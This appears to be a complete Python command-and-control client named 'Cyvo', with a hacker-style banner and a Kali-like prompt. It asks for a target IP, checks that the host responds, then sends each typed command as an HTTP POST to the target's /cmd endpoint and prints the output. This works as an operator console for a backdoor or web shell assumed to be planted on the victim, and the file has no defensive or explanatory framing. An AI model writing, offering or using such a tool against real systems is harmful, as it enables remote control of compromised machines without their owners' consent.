import requests

# Intro
print("""
 ██████╗██╗   ██╗██╗   ██╗ ██████╗ 
██╔════╝╚██╗ ██╔╝██║   ██║██╔═══██╗
██║      ╚████╔╝ ██║   ██║██║   ██║
██║       ╚██╔╝  ╚██╗ ██╔╝██║   ██║
╚██████╗   ██║    ╚████╔╝ ╚██████╔╝
 ╚═════╝   ╚═╝     ╚═══╝   ╚═════╝ 

Creator: IzanamiiDevv.
""")

def ControlLoop(ip: str) -> None:
    while True:
        try:
            command = input(f"\n┌──({ip}㉿Cyvo)-[~]\n└─$ ").strip()

            if command.lower() == "exit":
                print("Exiting control loop.")
                break

            response = requests.post(f"http://{ip}/cmd", data=command.encode(), headers={"Content-Type": "text/plain"}, timeout=5)
            print("Response:\n ", response.text)
        except KeyboardInterrupt:
            print("\nKeyboardInterrupt received. Exiting.")
            break
        except Exception as e:
            print("Failed to send POST request:", e)

def connect_and_run():
    try:
        ip = input("Enter the target IP: ").strip()
        print(f"Connecting to {ip}...")

        response = requests.get(f"http://{ip}", timeout=5)
        if response.status_code == 200:
            print("Connection succeeded.")
            ControlLoop(ip)
        else:
            print(f"Connection failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print("Execution failed:", e)
    except KeyboardInterrupt:
        print("\nProcess cancelled by user.")

# Entry point
if __name__ == "__main__":
    connect_and_run()
